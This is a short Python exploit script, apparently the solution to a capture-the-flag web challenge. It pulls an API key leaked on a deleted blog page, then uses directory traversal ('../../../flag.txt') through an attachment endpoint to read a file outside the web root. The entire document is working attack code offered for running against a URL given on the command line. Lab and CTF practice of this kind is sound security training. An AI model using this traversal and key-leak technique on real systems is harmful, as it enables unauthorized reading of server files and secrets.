import requests
import sys

if (len(sys.argv)) != 2: 
    print ('run: python exploit.py URL')
    quit()

url = sys.argv[1]

print ('Make sure you can connect to the website...')
response = requests.get(url)
print (f"{response.status_code=}")

print ('Get API key from deleted blog')
response = requests.get(f"{url}/blog/3")
print (f"{response.status_code=}")

if not 'key' in response.text: 
    print(f'failed to connect to deleted blog')
    quit()
api = response.text.split('pdf&')[1].split('" type')[0]  

print ('Grabbing flag from /flag.txt')
response = requests.get(f"{url}/attachment?file=../../../flag.txt&{api}")

print (f"{response.status_code=}")
print (response.text)